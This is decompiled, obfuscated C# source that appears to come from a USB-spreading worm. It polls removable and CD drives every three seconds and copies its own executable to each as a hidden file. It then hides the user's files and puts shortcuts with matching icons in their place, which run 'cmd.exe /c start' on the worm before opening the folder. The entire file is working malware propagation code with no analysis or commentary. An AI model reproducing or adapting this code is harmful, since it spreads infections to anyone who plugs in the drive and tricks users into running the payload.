using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns3;

internal class Class3
{
	public class Class4
	{
		public string string_0;

		public List<string> list_0;

		public List<string> list_1;

		public Class4()
		{
			list_0 = new List<string>();
			list_1 = new List<string>();
		}
	}

	private bool bool_0;

	private Thread thread_0;

	public string string_0;

	public Collection collection_0;

	public Class3()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		bool_0 = false;
		thread_0 = null;
		collection_0 = new Collection();
	}

	public void method_0()
	{
		if (thread_0 == null)
		{
			thread_0 = new Thread(method_2, 1);
			thread_0.Start();
		}
	}

	public void method_1()
	{
		bool_0 = true;
		while (thread_0 != null)
		{
			Thread.Sleep(1);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (!driveInfo.IsReady || !((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
				{
					continue;
				}
				if (File.Exists(driveInfo.Name + string_0))
				{
					File.SetAttributes(driveInfo.Name + string_0, FileAttributes.Normal);
					File.Delete(driveInfo.Name + string_0);
				}
				string[] files = Directory.GetFiles(driveInfo.Name);
				foreach (string text in files)
				{
					try
					{
						File.SetAttributes(text, FileAttributes.Normal);
						if (text.ToLower().EndsWith(".lnk"))
						{
							File.Delete(text);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] directories = Directory.GetDirectories(driveInfo.Name);
				foreach (string path in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						directoryInfo.Attributes = FileAttributes.Normal;
						directoryInfo = null;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void method_2()
	{
		thread_0 = null;
		method_1();
		thread_0 = Thread.CurrentThread;
		bool_0 = false;
		while (!bool_0)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					Class4 @class;
					if (!collection_0.Contains(driveInfo.Name.ToLower()))
					{
						@class = new Class4();
						@class.string_0 = driveInfo.Name;
						collection_0.Add((object)@class, driveInfo.Name.ToLower(), (object)null, (object)null);
					}
					else
					{
						@class = (Class4)collection_0.get_Item(driveInfo.Name.ToLower());
					}
					if (bool_0)
					{
						goto end_IL_001f;
					}
					try
					{
						if (!driveInfo.IsReady || !(((driveInfo.TotalFreeSpace > 0L) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
						{
							continue;
						}
						try
						{
							if (!File.Exists(driveInfo.Name + string_0))
							{
								File.Copy(Application.get_ExecutablePath(), driveInfo.Name + string_0, overwrite: true);
								File.SetAttributes(driveInfo.Name + string_0, FileAttributes.Hidden);
							}
							string[] files = Directory.GetFiles(driveInfo.Name);
							foreach (string text in files)
							{
								if (!((Operators.CompareString(Path.GetExtension(text)!.ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + string_0.ToLower(), false) != 0)))
								{
									continue;
								}
								if (!@class.list_0.Contains(new FileInfo(text).get_Name()))
								{
									if (@class.list_0.Count < 20)
									{
										method_3(driveInfo, text, method_4(Path.GetExtension(text)));
										@class.list_0.Add(new FileInfo(text).get_Name());
										File.SetAttributes(text, FileAttributes.Hidden);
										@class.list_1.Add(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"));
									}
								}
								else if (@class.list_0.Contains(new FileInfo(text).get_Name()))
								{
									if (File.GetAttributes(text) != FileAttributes.Hidden)
									{
										File.SetAttributes(text, FileAttributes.Hidden);
									}
									if (!File.Exists(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"))
									{
										method_3(driveInfo, text, method_4(Path.GetExtension(text)));
									}
									else if (Operators.CompareString(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"), @class.list_1[@class.list_0.IndexOf(new FileInfo(text).get_Name())], false) != 0)
									{
										method_3(driveInfo, text, method_4(Path.GetExtension(text)));
									}
								}
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(3000);
			continue;
			end_IL_001f:
			break;
		}
		thread_0 = null;
	}

	public object method_3(DriveInfo driveInfo_0, string string_1, string string_2)
	{
		try
		{
			File.Delete(driveInfo_0.Name + new FileInfo(string_1).get_Name() + ".lnk");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		object obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { driveInfo_0.Name + new FileInfo(string_1).get_Name() + ".lnk" }, (string[])null, (Type[])null, (bool[])null);
		NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + string_0.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(string_1).get_Name() + "\" & exit" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { string_2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		obj = null;
		object result = default(object);
		return result;
	}

	public string method_4(string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", writable: false);
			string text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(string_1, writable: false)!.GetValue(""), (object)"\\DefaultIcon\\")))!.GetValue("", ""));
			if (!text.Contains(","))
			{
				text += ",0";
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
